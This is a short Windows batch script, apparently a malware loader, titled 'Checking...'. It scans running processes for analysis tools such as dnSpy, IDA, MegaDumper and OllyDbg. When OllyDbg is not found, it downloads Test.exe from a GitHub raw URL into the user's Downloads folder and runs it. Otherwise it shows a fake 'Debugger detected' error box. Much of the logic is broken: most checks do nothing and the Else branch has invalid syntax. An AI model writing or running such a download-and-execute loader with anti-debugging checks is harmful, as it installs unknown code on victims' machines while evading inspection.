::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
title Checking...
@echo off 
cls
mode con: cols=20 lines=20
cls
tasklist | find /I "dnSpy"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "ida32"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "ida64"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "idaq32"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "idaq64"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "MegaDumper"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "die"
if errorlevel 1 (
cls
)
cls
tasklist | find /I "ollydbg"
if errorlevel 1 (
curl https://raw.githubusercontent.com/brendonkuar/.BAT-loader/main/Test.exe >> %userprofile%\Downloads\Test.exe
start Test.exe
)
Else(
echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
)
